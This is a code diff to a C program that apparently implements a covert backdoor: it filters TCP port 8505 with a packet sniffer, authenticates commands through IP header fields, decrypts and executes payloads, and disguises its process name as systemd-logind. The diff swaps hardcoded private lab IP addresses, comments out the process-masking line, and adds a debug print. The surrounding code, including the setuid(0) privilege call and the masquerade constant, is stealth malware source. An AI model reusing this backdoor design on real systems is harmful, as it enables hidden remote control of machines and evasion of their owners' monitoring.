@@ -2,8 +2,6 @@
 
 #define FILTER "tcp and port 8505"
 #define PAYLOAD_KEY "8505"
-#define ADDRESS "192.168.1.13"
-#define ADDRESS_LOCAL "192.168.1.3"
 #define PORT "8505"
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
@@ -24,13 +22,13 @@ void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id);
 int main(int argc, char **argv){
-    strcpy(argv[0], MASK);
+    //strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
     setuid(0);
     setgid(0);
     char *c = "c";
-    char *sip = "192.168.1.3";
-    char *dip = "192.168.1.13";
+    char *sip = "192.168.43.61";
+    char *dip = "192.168.43.148";
     unsigned short sport = 22;
     unsigned short dport = 8505;
     unsigned char data[BUFSIZE] = "hello";
@@ -187,6 +185,8 @@ void ParsePayload(const u_char *payload, int len){
     cipherlen = strlen((char*)payload);
     printf("Encrypted Payload is: %s \n", payload);
     decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
+
+    printf("Encrypted payload size: %d\n", decryptedlen);
     printf("Encrypted Payload is: %s \n", decryptedtext);
     if((fwrite(decryptedtext, sizeof(decryptedtext), sizeof(char), fp)) <= 0){
         perror("fwrite");
